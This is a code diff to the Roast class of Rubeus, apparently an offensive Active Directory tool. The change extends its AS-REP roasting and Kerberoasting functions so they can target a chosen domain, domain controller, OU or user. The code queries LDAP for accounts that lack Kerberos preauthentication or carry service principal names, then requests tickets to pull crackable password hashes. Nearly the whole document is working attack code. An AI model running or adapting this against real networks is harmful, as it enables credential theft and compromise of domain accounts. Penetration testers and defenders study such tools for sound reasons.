@@ -11,43 +11,67 @@ namespace Rubeus
 {
     public class Roast
     {
-        //public static void ASRepRoast(string userName, string domain, string domainController = "", string format = "john", string outFile = "")
-        //{
-        //    GetASRepHash(userName, domain, domainController, format, outFile);
-        //}
-
         public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "")
         {
-            Console.WriteLine("[*] Action: AS-REP roasting\r\n");
-
-            DirectoryEntry directoryObject = null;
-            DirectorySearcher userSearcher = null;
-            string bindPath = "";
+            Console.WriteLine("\r\n[*] Action: AS-REP roasting\r\n");
 
             if (!String.IsNullOrEmpty(userName))
             {
+                Console.WriteLine("[*] Target User            : {0}", userName);
+            }
+            if (!String.IsNullOrEmpty(OUName))
+            {
+                Console.WriteLine("[*] Target OU              : {0}", OUName);
+            }
+            if (!String.IsNullOrEmpty(domain))
+            {
+                Console.WriteLine("[*] Target Domain          : {0}", domain);
+            }
+            if (!String.IsNullOrEmpty(domainController))
+            {
+                Console.WriteLine("[*] Target DC              : {0}", domainController);
+            }
+
+            Console.WriteLine();
+
+            if (!String.IsNullOrEmpty(userName) && !String.IsNullOrEmpty(domain) && !String.IsNullOrEmpty(domainController))
+            {
+                // if we have a username, domain, and DC specified, we don't need to search for users and can roast directly
                 GetASRepHash(userName, domain, domainController, format, outFile);
             }
-            else
-            {
+            else {
+                DirectoryEntry directoryObject = null;
+                DirectorySearcher userSearcher = null;
+                string bindPath = "";
+                string domainPath = "";
+
                 try
                 {
-                    if (cred != null)
+                    if (String.IsNullOrEmpty(domainController))
                     {
-                        if (!String.IsNullOrEmpty(OUName))
+                        if (!String.IsNullOrEmpty(domain))
                         {
-                            string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
-                            bindPath = String.Format("LDAP://{0}/{1}", cred.Domain, ouPath);
+                            // if a foreign domain is specified but no DC, use the domain name as the DC
+                            domainController = domain;
                         }
                         else
                         {
-                            bindPath = String.Format("LDAP://{0}", cred.Domain);
+                            // otherwise grab the system's current DC
+                            domainController = Networking.GetDCName();
                         }
                     }
-                    else if (!String.IsNullOrEmpty(OUName))
+
+                    bindPath = String.Format("LDAP://{0}", domainController);
+
+                    if (!String.IsNullOrEmpty(OUName))
                     {
                         string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
-                        bindPath = String.Format("LDAP://{0}", ouPath);
+                        bindPath = String.Format("{0}/{1}", bindPath, ouPath);
+                    }
+                    else if (!String.IsNullOrEmpty(domain))
+                    {
+                        domainPath = domain.Replace(".", ",DC=");
+                        bindPath = String.Format("{0}/DC={1}", bindPath, domainPath);
                     }
 
                     if (!String.IsNullOrEmpty(bindPath))
@@ -72,6 +96,10 @@ namespace Rubeus
                             {
                                 Console.WriteLine("\r\n[X] Credentials supplied for '{0}' are invalid!", userDomain);
                                 return;
+                            }
+                            else
+                            {
+                                Console.WriteLine("[*] Using alternate creds  : {0}\r\n", userDomain);
                             }
                         }
                     }
@@ -104,7 +132,14 @@ namespace Rubeus
 
                 try
                 {
-                    userSearcher.Filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
+                    if (String.IsNullOrEmpty(userName))
+                    {
+                        userSearcher.Filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
+                    }
+                    else
+                    {
+                        userSearcher.Filter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);
+                    }
                 }
                 catch (Exception ex)
                 {
@@ -116,9 +151,18 @@ namespace Rubeus
                 {
                     SearchResultCollection users = userSearcher.FindAll();
 
+                    if (users.Count == 0)
+                    {
+                        Console.WriteLine("[X] No users found to AS-REP roast!");
+                    }
+
                     foreach (SearchResult user in users)
                     {
                         string samAccountName = user.Properties["samAccountName"][0].ToString();
+                        string distinguishedName = user.Properties["distinguishedName"][0].ToString();
+                        Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
+                        Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
+
                         GetASRepHash(samAccountName, domain, domainController, format, outFile);
                     }
                 }
@@ -194,7 +238,7 @@ namespace Rubeus
                     {
                         Console.WriteLine("Exception: {0}", e.Message);
                     }
-                    Console.WriteLine("[*] Hash written to {0}", outFilePath);
+                    Console.WriteLine("[*] Hash written to {0}\r\n", outFilePath);
                 }
                 else
                 {
@@ -205,8 +249,8 @@ namespace Rubeus
                     {
                         Console.WriteLine("      {0}", line);    
                     }
+                    Console.WriteLine();
                 }
-                Console.WriteLine();
             }
             else if (responseTag == 30)
             {
@@ -220,20 +264,36 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", System.Net.NetworkCredential cred = null, string outFile = "")
+        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "")
         {
-            Console.WriteLine("[*] Action: Kerberoasting");
+            Console.WriteLine("\r\n[*] Action: Kerberoasting\r\n");
 
             if (!String.IsNullOrEmpty(spn))
             {
-                Console.WriteLine("\r\n[*] ServicePrincipalName   : {0}", spn);
+                Console.WriteLine("[*] Target SPN             : {0}", spn);
                 GetDomainSPNTicket(spn, outFile);
             }
-            else
-            {
+            else {
+                if ((!String.IsNullOrEmpty(domain)) || (!String.IsNullOrEmpty(OUName)) || (!String.IsNullOrEmpty(userName)))
+                {
+                    if (!String.IsNullOrEmpty(userName))
+                    {
+                        Console.WriteLine("[*] Target User            : {0}", userName);
+                    }
+                    if (!String.IsNullOrEmpty(domain))
+                    {
+                        Console.WriteLine("[*] Target Domain          : {0}", domain);
+                    }
+                    if (!String.IsNullOrEmpty(OUName))
+                    {
+                        Console.WriteLine("[*] Target OU              : {0}", OUName);
+                    }
+                }
+
                 DirectoryEntry directoryObject = null;
                 DirectorySearcher userSearcher = null;
                 string bindPath = "";
+                string domainPath = "";
 
                 try
                 {
@@ -249,10 +309,25 @@ namespace Rubeus
                             bindPath = String.Format("LDAP://{0}", cred.Domain);
                         }
                     }
-                    else if (!String.IsNullOrEmpty(OUName))
+                    else if ((!String.IsNullOrEmpty(domain)) || !String.IsNullOrEmpty(OUName))
                     {
-                        string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
-                        bindPath = String.Format("LDAP://{0}", ouPath);
+                        if (String.IsNullOrEmpty(dc))
+                        {
+                            dc = Networking.GetDCName();
+                        }
+
+                        bindPath = String.Format("LDAP://{0}", dc);
+
+                        if (!String.IsNullOrEmpty(OUName))
+                        {
+                            string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
+                            bindPath = String.Format("{0}/{1}", bindPath, ouPath);
+                        }
+                        else if (!String.IsNullOrEmpty(domain))
+                        {
+                            domainPath = domain.Replace(".", ",DC=");
+                            bindPath = String.Format("{0}/DC={1}", bindPath, domainPath);
+                        }
                     }
 
                     if (!String.IsNullOrEmpty(bindPath))
@@ -277,6 +352,10 @@ namespace Rubeus
                             {
                                 Console.WriteLine("\r\n[X] Credentials supplied for '{0}' are invalid!", userDomain);
                                 return;
+                            }
+                            else
+                            {
+                                Console.WriteLine("[*] Using alternate creds  : {0}", userDomain);
                             }
                         }
                     }
@@ -328,6 +407,11 @@ namespace Rubeus
                 {
                     SearchResultCollection users = userSearcher.FindAll();
 
+                    if (users.Count == 0)
+                    {
+                        Console.WriteLine("\r\n[X] No users found to Kerberoast!");
+                    }
+
                     foreach (SearchResult user in users)
                     {
                         string samAccountName = user.Properties["samAccountName"][0].ToString();
@@ -336,7 +420,14 @@ namespace Rubeus
                         Console.WriteLine("\r\n[*] SamAccountName         : {0}", samAccountName);
                         Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                         Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);
-                        GetDomainSPNTicket(servicePrincipalName, userName, distinguishedName, cred, outFile);
+                        if (!String.IsNullOrEmpty(domain))
+                        {
+                            string SPN = String.Format("{0}@{1}", servicePrincipalName, domain);
+                            GetDomainSPNTicket(SPN, userName, distinguishedName, cred, outFile);
+                        }
+                        else {
+                            GetDomainSPNTicket(servicePrincipalName, userName, distinguishedName, cred, outFile);
+                        }
                     }
                 }
                 catch (Exception ex)
